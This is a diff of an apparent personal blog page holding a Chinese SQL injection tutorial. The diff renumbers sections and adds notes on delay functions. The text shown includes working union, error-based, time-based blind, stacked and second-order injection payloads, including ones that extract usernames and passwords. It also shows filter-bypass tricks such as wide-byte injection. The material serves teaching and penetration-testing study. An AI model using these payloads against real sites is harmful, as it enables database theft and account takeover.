@@ -29,7 +29,7 @@
 <meta property="og:image" content="https://i4g5d.github.io/2025/10/23/SQLI/80d2a4ffaa0cb7d7d1db82770ccdf1cf.png">
 <meta property="og:image" content="https://i4g5d.github.io/2025/10/23/SQLI/image-20251024195214666.png">
 <meta property="article:published_time" content="2025-10-23T09:06:43.000Z">
-<meta property="article:modified_time" content="2025-11-06T08:32:05.320Z">
+<meta property="article:modified_time" content="2025-11-14T12:50:51.118Z">
 <meta property="article:author" content="i4G5d">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://i4g5d.github.io/2025/10/23/SQLI/80d2a4ffaa0cb7d7d1db82770ccdf1cf.png">
@@ -225,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          7.1k 字
+          7.4k 字
         
       </span>
     
@@ -236,7 +236,7 @@
         
         
         
-          60 分钟
+          62 分钟
         
       </span>
     
@@ -406,7 +406,7 @@
 <li>没有显示位；就考虑报错注入或者时间注入</li>
 <li>没有报错信息；就不能报错注入</li>
 </ul>
-<h3 id="5-注入方式"><a href="#5-注入方式" class="headerlink" title="5.注入方式"></a>5.注入方式</h3><h4 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h4><p>​	前提要有回显，要先查到列数；</p>
+<h3 id="5-注入方式"><a href="#5-注入方式" class="headerlink" title="5.注入方式"></a>5.注入方式</h3><h4 id="5-1-联合注入"><a href="#5-1-联合注入" class="headerlink" title="5.1 联合注入"></a>5.1 联合注入</h4><p>​	前提要有回显，要先查到列数；</p>
 <ol>
 <li><p>判断列数 </p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span>；<br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure>
@@ -426,18 +426,19 @@
 <li><p>查字段名和具体数据</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>name<span class="hljs-string">&#x27;</span><br><span class="hljs-string">id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(username,password) <span class="hljs-keyword">from</span> users <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure></li>
 </ol>
-<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>​	前提：页面会显示数据库报错信息。</p>
+<h4 id="5-2-报错注入"><a href="#5-2-报错注入" class="headerlink" title="5.2 报错注入"></a>5.2 报错注入</h4><p>​	前提：页面会显示数据库报错信息。</p>
 <p>​	<code>updatexml()</code>（<code>extractvalue</code>） 在 MySQL 中用于对 XML 数据执行 XPath 操作。它的调用签名像 <code>updatexml(xml_doc, xpath_expr, new_value)</code>。当第二个参数（xpath 表达式）不是合法的 XPath 或无法解析时，MySQL 会抛出一个错误，并且错误信息会包含供解析的那个字符串（也就是我们传入的 <code>concat(...)</code> 的结果）。</p>
 <ol>
 <li><p>查库名</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) --+</span><br><span class="hljs-string">id=1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat((database()),<span class="hljs-built_in">floor</span> (rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a) <span class="hljs-comment">--+</span><br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(schema_name)from information_schema.schemata),0x7e),1) --+</span><br></code></pre></td></tr></table></figure></li>
 </ol>
-<h3 id="（时间-布尔）盲注"><a href="#（时间-布尔）盲注" class="headerlink" title="（时间&#x2F;布尔）盲注"></a>（时间&#x2F;布尔）盲注</h3><p>​	因为是盲猜，所以无论是布尔还是时间都会很慢</p>
+<h3 id="5-3-（时间-布尔）盲注"><a href="#5-3-（时间-布尔）盲注" class="headerlink" title="5.3 （时间&#x2F;布尔）盲注"></a>5.3 （时间&#x2F;布尔）盲注</h3><p>​	因为是盲猜，所以无论是布尔还是时间都会很慢</p>
 <p>​	盲注主要是通过if语句去一个一个猜个数，猜字符。所以时间盲注只不过是把布尔盲注的响应换成sleep时间，所以下面主要以时间盲注为例</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">if(条件,<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>)；substr(str,<span class="hljs-keyword">from</span>,length)；limit 选填偏移量 行数；<br></code></pre></td></tr></table></figure>
 
 <ol>
-<li><p>爆库个数</p>
+<li>爆库个数</li>
+</ol>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> if((<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata)<span class="hljs-operator">=</span><span class="hljs-number">9</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
 
 <ol start="2">
@@ -452,28 +453,29 @@
 
 <p>这样下来就能一个一个猜出数据库，随后就是和联合注入说的一样的思路去猜表数，猜表名，猜字段名，猜字段</p>
 <p>查当前库就简单一点</p>
-</li>
-</ol>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; and if((length(database()))=<span class="hljs-number">7</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>) --+  查库长度<br><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; and if((select count(*) from information_schema.tables where table_schema=database())=<span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)--+ 查表数量<br></code></pre></td></tr></table></figure>
 
 <p>​	其实抽象起来就这几个</p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">id=<span class="hljs-number">1</span> and <span class="hljs-built_in">if</span>(       <span class="hljs-selector-tag">select</span> <span class="hljs-built_in">count</span>(*) 查个数         ,<span class="hljs-built_in">sleep</span>(<span class="hljs-number">2</span>),<span class="hljs-number">1</span>)<br>id=<span class="hljs-number">1</span> and <span class="hljs-built_in">if</span>(       <span class="hljs-selector-tag">select</span> <span class="hljs-built_in">length</span>() limit 查长度     ,<span class="hljs-built_in">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-number">1</span> )<br>id=<span class="hljs-number">1</span> and <span class="hljs-built_in">if</span>(       <span class="hljs-built_in">substr</span>(  (<span class="hljs-selector-tag">select</span> limit语句)  <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)  查字符     ， <span class="hljs-built_in">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-number">1</span> )<br></code></pre></td></tr></table></figure>
 
+<p>除了sleep还有一些常用可造成延迟的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">benchmark(1000000, SHA1(&#x27;test&#x27;))  #重复 100 万次 SHA1 哈希计算，会产生明显延迟。                         循环<br>SELECT COUNT(*) FROM large_table GROUP BY every_column  #利用扫描很大数据造成CPU产生计算时差             扫描<br>LOAD_FILE()    #若能出网，访问无效文件，产生网络超时                                                     超时<br></code></pre></td></tr></table></figure>
 
 
-<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>​	当注入点使用的执行函数允许一次性执行多个 SQL 语句的时候，例如 PHP 中的 <code>multi_muti_query</code>或者PDO，堆叠注入即存在。堆叠注入相较于其他方式，利用的手法更加自由，不局限于原来的 SELECT 语句，而可以拓展到 INSERT、SHOW、SET、UPDATE 语句等。</p>
+
+<h4 id="5-4-堆叠注入"><a href="#5-4-堆叠注入" class="headerlink" title="5.4 堆叠注入"></a>5.4 堆叠注入</h4><p>​	当注入点使用的执行函数允许一次性执行多个 SQL 语句的时候，例如 PHP 中的 <code>multi_muti_query</code>或者PDO，堆叠注入即存在。堆叠注入相较于其他方式，利用的手法更加自由，不局限于原来的 SELECT 语句，而可以拓展到 INSERT、SHOW、SET、UPDATE 语句等。</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show tables--+</span><br><span class="hljs-string">id=1&#x27;</span>;<span class="hljs-keyword">select</span> sleep(<span class="hljs-number">5</span>)_<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
 
 
 
-<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>​	部分网站在代码层面上对sql注入的防御通常是写一个无敌的过滤器出来，自定义为安全函数。然后所有用户传入的参数都经过这个安全函数处理。</p>
+<h4 id="5-5-二次注入"><a href="#5-5-二次注入" class="headerlink" title="5.5 二次注入"></a>5.5 二次注入</h4><p>​	部分网站在代码层面上对sql注入的防御通常是写一个无敌的过滤器出来，自定义为安全函数。然后所有用户传入的参数都经过这个安全函数处理。</p>
 <p>​	于是攻击者把payload先存入数据库，然后在另一处调出这个payload，以此触发payload。</p>
 <p>​	设计者忽视没有经过用户传参的sql语句，就达成了二次注入</p>
 <p>​	比如注册一个用户名为**admin’ #**的用户，注册时并无SQL注入，修改密码时的SQL语句为：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">update user set password=&#x27;$password&#x27; where username=&#x27;admin&#x27; #&#x27;<br></code></pre></td></tr></table></figure>
 
 <p>​	导致越权修改了admin的密码。由于二次注入利用链比较长，更容易被开发忽视，但往往黑盒很难测试出来，需要代码审计。</p>
-<h3 id="6-绕过过滤"><a href="#6-绕过过滤" class="headerlink" title="6. 绕过过滤"></a>6. 绕过过滤</h3><h4 id="1-通用绕过关键字方"><a href="#1-通用绕过关键字方" class="headerlink" title="1. 通用绕过关键字方"></a>1. 通用绕过关键字方</h4><p>（1）<code>/**/</code> <code>&lt;&gt;</code>分割</p>
+<h3 id="6-绕过过滤"><a href="#6-绕过过滤" class="headerlink" title="6. 绕过过滤"></a>6. 绕过过滤</h3><h4 id="6-1-通用绕过关键字方"><a href="#6-1-通用绕过关键字方" class="headerlink" title="6.1. 通用绕过关键字方"></a>6.1. 通用绕过关键字方</h4><p>（1）<code>/**/</code> <code>&lt;&gt;</code>分割</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">sel<span class="hljs-operator">&lt;&gt;</span>ect<br>sel<span class="hljs-comment">/**/</span>ect<br></code></pre></td></tr></table></figure>
 
 <p>（2）大小混写和双写</p>
@@ -482,7 +484,7 @@
 <p>（3）编码</p>
 <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">url编码绕过<br>16进制编码绕过<br>ASCII编码绕过<br></code></pre></td></tr></table></figure>
 
-<h4 id="2-绕过符号过滤"><a href="#2-绕过符号过滤" class="headerlink" title="2. 绕过符号过滤"></a>2. 绕过符号过滤</h4><p>（1）逗号</p>
+<h4 id="6-2-绕过符号过滤"><a href="#6-2-绕过符号过滤" class="headerlink" title="6.2. 绕过符号过滤"></a>6.2. 绕过符号过滤</h4><p>（1）逗号</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">3</span>)  <span class="hljs-comment">-- join代替</span><br><span class="hljs-comment">-- 盲注中</span><br>substr(str <span class="hljs-keyword">from</span> pos <span class="hljs-keyword">for</span> len) <span class="hljs-comment">--在str中从第pos位截取len长的字符</span><br>mid(str <span class="hljs-keyword">from</span> pos <span class="hljs-keyword">for</span> len) <span class="hljs-comment">--在str中从第pos位截取len长的字符</span><br>limit <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">1</span><br><span class="hljs-built_in">substring</span>(str <span class="hljs-keyword">from</span> pos) <span class="hljs-comment">--返回字符串str的第pos个字符，索引从1开始</span><br></code></pre></td></tr></table></figure>
 
 <p>（2）空格</p>
@@ -496,7 +498,7 @@
 
 
 
-<h4 id="3-寻找等价函数"><a href="#3-寻找等价函数" class="headerlink" title="3.寻找等价函数"></a>3.寻找等价函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql">hex()、bin() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> ascii() <br>sleep() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> benchmark() <br>concat_ws()<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>group_concat() <br>mid()、substr() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-built_in">substring</span>() <br>@<span class="hljs-variable">@user</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">user</span>() <br>@<span class="hljs-variable">@datadir</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> datadir() <br>举例：<span class="hljs-built_in">substring</span>()和substr()无法使用时：?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">+</span><span class="hljs-keyword">and</span><span class="hljs-operator">+</span>ascii(<span class="hljs-built_in">lower</span>(mid((<span class="hljs-keyword">select</span><span class="hljs-operator">+</span>pwd<span class="hljs-operator">+</span><span class="hljs-keyword">from</span><span class="hljs-operator">+</span>users<span class="hljs-operator">+</span>limit<span class="hljs-operator">+</span><span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))<span class="hljs-operator">=</span><span class="hljs-number">74</span>　 <br>或者： substr((<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;password&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0x70</span> <br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x69</span>) <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x70</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0</span> <br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x71</span>) <span class="hljs-operator">=</span> <span class="hljs-number">-1</span><br><span class="hljs-keyword">into</span> <span class="hljs-variable">@a</span>,<span class="hljs-variable">@b</span>  <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span><br></code></pre></td></tr></table></figure>
+<h4 id="6-3-寻找等价函数"><a href="#6-3-寻找等价函数" class="headerlink" title="6.3.寻找等价函数"></a>6.3.寻找等价函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql">hex()、bin() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> ascii() <br>sleep() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> benchmark() <br>concat_ws()<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>group_concat() <br>mid()、substr() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-built_in">substring</span>() <br>@<span class="hljs-variable">@user</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">user</span>() <br>@<span class="hljs-variable">@datadir</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> datadir() <br>举例：<span class="hljs-built_in">substring</span>()和substr()无法使用时：?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">+</span><span class="hljs-keyword">and</span><span class="hljs-operator">+</span>ascii(<span class="hljs-built_in">lower</span>(mid((<span class="hljs-keyword">select</span><span class="hljs-operator">+</span>pwd<span class="hljs-operator">+</span><span class="hljs-keyword">from</span><span class="hljs-operator">+</span>users<span class="hljs-operator">+</span>limit<span class="hljs-operator">+</span><span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))<span class="hljs-operator">=</span><span class="hljs-number">74</span>　 <br>或者： substr((<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;password&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0x70</span> <br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x69</span>) <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x70</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0</span> <br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x71</span>) <span class="hljs-operator">=</span> <span class="hljs-number">-1</span><br><span class="hljs-keyword">into</span> <span class="hljs-variable">@a</span>,<span class="hljs-variable">@b</span>  <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span><br></code></pre></td></tr></table></figure>
 
 <p>​	infromation_schema被过滤的话：</p>
 <ul>
@@ -513,7 +515,7 @@
 <li><h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><p>在因为 <code>information_schema</code> 被过滤或其他原因无法获得字段名的时候，可以通过别名的方式绕过获取<strong>字段名</strong>的这一步骤</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> a,b <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> a, <span class="hljs-number">2</span> <span class="hljs-keyword">as</span> b <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users)x;<br></code></pre></td></tr></table></figure></li>
 </ul>
-<h4 id="4-非常规"><a href="#4-非常规" class="headerlink" title="4. 非常规"></a>4. 非常规</h4><p>​	比如脏数据溢出绕过，pipline绕过，分块传输绕过，白名单绕过，宽字节，多参数， 。</p>
+<h4 id="6-4-非常规"><a href="#6-4-非常规" class="headerlink" title="6.4. 非常规"></a>6.4. 非常规</h4><p>​	比如脏数据溢出绕过，pipline绕过，分块传输绕过，白名单绕过，宽字节，多参数， 。</p>
 <p>​	宽字节注入：</p>
 <p>​	有些时候系统使用如下代码进行转义（例如在 PHP 中）：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">$username <span class="hljs-operator">=</span> addslashes($_GET[<span class="hljs-string">&#x27;username&#x27;</span>]); <span class="hljs-operator">/</span><span class="hljs-operator">/</span> 会将 <span class="hljs-string">&#x27; 变成 \&#x27;</span><br></code></pre></td></tr></table></figure>
